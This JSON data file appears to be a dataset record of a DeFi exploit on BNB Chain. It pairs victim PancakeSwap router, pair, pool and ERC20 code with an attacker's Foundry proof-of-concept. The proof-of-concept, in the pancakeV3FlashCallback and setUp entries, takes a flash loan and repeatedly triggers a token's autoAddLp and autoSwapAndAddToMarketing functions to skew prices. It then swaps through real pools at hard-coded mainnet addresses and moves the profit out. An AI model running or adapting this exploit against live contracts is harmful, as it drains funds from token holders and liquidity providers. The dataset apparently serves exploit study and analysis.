[
  {
    "contract/interface": "IPancakeRouter",
    "source_type": "victim_contract",
    "function_name": "getAmountsIn",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPancakeRouter",
    "source_type": "victim_contract",
    "function_name": "getAmountsOut",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPancakeRouter",
    "source_type": "victim_contract",
    "function_name": "swapExactTokensForTokensSupportingFeeOnTransferTokens",
    "original_code": "    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakePair",
    "source_type": "victim_contract",
    "function_name": "swap",
    "original_code": "    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {\n        require(amount0Out > 0 || amount1Out > 0, 'Pancake: INSUFFICIENT_OUTPUT_AMOUNT');\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        require(amount0Out < _reserve0 && amount1Out < _reserve1, 'Pancake: INSUFFICIENT_LIQUIDITY');\n\n        uint balance0;\n        uint balance1;\n        { // scope for _token{0,1}, avoids stack too deep errors\n        address _token0 = token0;\n        address _token1 = token1;\n        require(to != _token0 && to != _token1, 'Pancake: INVALID_TO');\n        if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens\n        if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens\n        if (data.length > 0) IPancakeCallee(to).pancakeCall(msg.sender, amount0Out, amount1Out, data);\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n        }\n        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;\n        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;\n        require(amount0In > 0 || amount1In > 0, 'Pancake: INSUFFICIENT_INPUT_AMOUNT');\n        { // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n        uint balance0Adjusted = (balance0.mul(10000).sub(amount0In.mul(25)));\n        uint balance1Adjusted = (balance1.mul(10000).sub(amount1In.mul(25)));\n        require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(10000**2), 'Pancake: K');\n        }\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n    }\n\n    // force balances to match reserves\n",
    "description": ""
  },
  {
    "contract/interface": "Token8633_9419_exp",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Token8633_9419_exp",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Token8633_9419_exp",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Token8633_9419_exp",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Token8633_9419_exp",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "Token8633_9419_exp",
    "source_type": "attacker_contract",
    "function_name": "pancakeV3FlashCallback",
    "original_code": "    function pancakeV3FlashCallback(uint256, uint256, bytes memory) public {\n        x55d3.balanceOf(r);\n        x55d3.balanceOf(address(x5b4d));\n        x55d3.balanceOf(x5752);\n        x8633.balanceOf(address(x5b4d));\n        x8633.balanceOf(address(x1281));\n        x55d3.transfer(address(x1281), 12_963_077_939_873_677_887_580);\n        for (uint256 i = 0; i < 130; i++) {\n            x1281.autoAddLp();\n        }\n\n        address[] memory path = new address[](2);\n        path[0] = address(x55d3);\n        path[1] = address(x8633);\n        x10ed.getAmountsOut(1e24, path);\n        address[] memory path2 = new address[](2);\n        path2[0] = address(x55d3);\n        path2[1] = address(x0cca);\n        x10ed.getAmountsIn(12_757_806_796_945_991_578_214_185_129_315, path2);\n        x55d3.approve(address(x10ed), type(uint256).max);\n        x0cca.approve(address(x10ed), type(uint256).max);\n        x10ed.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            839_828_983_139_806_906_579, 0, path2, r, 1_700_144_157\n        );\n        x0cca.balanceOf(r);\n        x55d3.transfer(address(x5b4d), 1e24);\n        x5b4d.swap(0, 12_757_806_796_945_991_578_214_185_129_315, x5a52, \"\");\n        x0cca.approve(x5a52, 12_757_806_796_945_991_578_214_185_129_315);\n        x0cca.balanceOf(r);\n        x0cca.transfer(x9a0c, 1_056_998_382_300_994_038_915_644_566_868);\n        (bool success,) = x5a52.call(hex\"004b2cc0\");\n        require(success, \"Low-level call failed\");\n        x8633.balanceOf(r);\n        for (uint256 i = 0; i < 900; i++) {\n            x11cd.autoSwapAndAddToMarketing();\n        }\n\n        x8633.balanceOf(r);\n        x8633.approve(address(x10ed), type(uint256).max);\n        x55d3.approve(address(x10ed), type(uint256).max);\n        address[] memory path3 = new address[](2);\n        path3[0] = address(x8633);\n        path3[1] = address(x55d3);\n        x10ed.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            12_757_806_796_944_991_578_214_185_129_315, 0, path3, r, 1_700_144_157\n        );\n        x55d3.balanceOf(r);\n        x55d3.balanceOf(r);\n        x55d3.balanceOf(r);\n        x55d3.transfer(address(x92b7), 1_100_110_000_000_000_000_000_000);\n        x55d3.balanceOf(r);\n        x55d3.transfer(xba0b, 26_362_092_911_372_968_412_790);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Token8633_9419_exp",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"https://rpc.ankr.com/bsc\", 33_545_074);\n        // vm.createSelectFork(\"https://rpc.ankr.com/bsc\", bytes32(0xf6ec3c22b718c3da17746416992bac7b65a4ef42ccf5b43cf0716c82bffc2844));\n    }\n\n    IERC20 constant x0cca = IERC20(0x0cCa1055f3827b6D2f530d52c514E3699c98F3B9);\n    IERC20 constant x55d3 = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IERC20 constant x8633 = IERC20(0x86335cb69e4E28fad231dAE3E206ce90849a5477);\n    IPancakePair constant x5b4d = IPancakePair(0x5b4D39f3d6ab3Ee426Bc5B15fF65B1EeD8BB68C2);\n    IPancakeRouter constant x10ed = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    IPancakePool constant x92b7 = IPancakePool(0x92b7807bF19b7DDdf89b706143896d05228f3121);\n    IHelper constant x11cd = IHelper(0x11Cd2168fc420ae1375626655ab8f355F0075Bd6);\n    IHelper constant x1281 = IHelper(0x128112aF3aF5478008c84d77c63561885FBBC438);\n    address constant x5752 = 0x57528D1cf2b14Bb35781Df41099f10Cd927FF026;\n    address constant x5a52 = 0x5a522C949F3DcBc30f511E20D72fb44B770f28e6;\n    address constant x9a0c = 0x9a0Ccc75d0B8Ef0BeAc89ECA9f4dC17AD6770AAD;\n    address constant xba0b = 0xBA0bcb1D0a2166D26a4Bfd9fAbb825369ab36209;\n\n",
    "description": ""
  },
  {
    "contract/interface": "Token8633_9419_exp",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Token8633_9419_exp",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Token8633_9419_exp",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Token8633_9419_exp",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Token8633_9419_exp",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Token8633_9419_exp",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Token8633_9419_exp",
    "source_type": "attacker_contract",
    "function_name": "test",
    "original_code": "    function test() public {\n        // vm.prank(0xe9FAc789C947f364f53C3BC28bB6E9e099526468, 0xe9FAc789C947f364f53C3BC28bB6E9e099526468);\n        xd8ea4b59();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Token8633_9419_exp",
    "source_type": "attacker_contract",
    "function_name": "xd8ea4b59",
    "original_code": "    function xd8ea4b59() public {\n        x92b7.flash(r, 1.1e24, 0, hex\"30783030\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IHelper",
    "source_type": "victim_contract",
    "function_name": "autoAddLp",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IHelper",
    "source_type": "victim_contract",
    "function_name": "autoSwapAndAddToMarketing",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IERC20",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint256 amount) public override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n \n",
    "description": ""
  },
  {
    "contract/interface": "IERC20",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n \n",
    "description": ""
  },
  {
    "contract/interface": "IERC20",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address recipient, uint256 amount) public override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n \n",
    "description": ""
  },
  {
    "contract/interface": "IERC20",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\n        _transfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n        return true;\n    }\n \n",
    "description": ""
  },
  {
    "contract/interface": "IPancakePool",
    "source_type": "victim_contract",
    "function_name": "flash",
    "original_code": "    function flash(\n        address recipient,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external override lock {\n        uint128 _liquidity = liquidity;\n        require(_liquidity > 0, 'L');\n\n        uint256 fee0 = FullMath.mulDivRoundingUp(amount0, fee, 1e6);\n        uint256 fee1 = FullMath.mulDivRoundingUp(amount1, fee, 1e6);\n        uint256 balance0Before = balance0();\n        uint256 balance1Before = balance1();\n\n        if (amount0 > 0) TransferHelper.safeTransfer(token0, recipient, amount0);\n        if (amount1 > 0) TransferHelper.safeTransfer(token1, recipient, amount1);\n\n        IPancakeV3FlashCallback(msg.sender).pancakeV3FlashCallback(fee0, fee1, data);\n\n        uint256 balance0After = balance0();\n        uint256 balance1After = balance1();\n\n        require(balance0Before.add(fee0) <= balance0After, 'F0');\n        require(balance1Before.add(fee1) <= balance1After, 'F1');\n\n        // sub is safe because we know balanceAfter is gt balanceBefore by at least fee\n        uint256 paid0 = balance0After - balance0Before;\n        uint256 paid1 = balance1After - balance1Before;\n\n        if (paid0 > 0) {\n            uint32 feeProtocol0 = slot0.feeProtocol % PROTOCOL_FEE_SP;\n            uint256 fees0 = feeProtocol0 == 0 ? 0 : (paid0 * feeProtocol0) / PROTOCOL_FEE_DENOMINATOR;\n            if (uint128(fees0) > 0) protocolFees.token0 += uint128(fees0);\n            feeGrowthGlobal0X128 += FullMath.mulDiv(paid0 - fees0, FixedPoint128.Q128, _liquidity);\n        }\n        if (paid1 > 0) {\n            uint32 feeProtocol1 = slot0.feeProtocol >> 16;\n            uint256 fees1 = feeProtocol1 == 0 ? 0 : (paid1 * feeProtocol1) / PROTOCOL_FEE_DENOMINATOR;\n            if (uint128(fees1) > 0) protocolFees.token1 += uint128(fees1);\n            feeGrowthGlobal1X128 += FullMath.mulDiv(paid1 - fees1, FixedPoint128.Q128, _liquidity);\n        }\n\n        emit Flash(msg.sender, recipient, amount0, amount1, paid0, paid1);\n    }\n\n    /// @inheritdoc IPancakeV3PoolOwnerActions\n",
    "description": ""
  }
]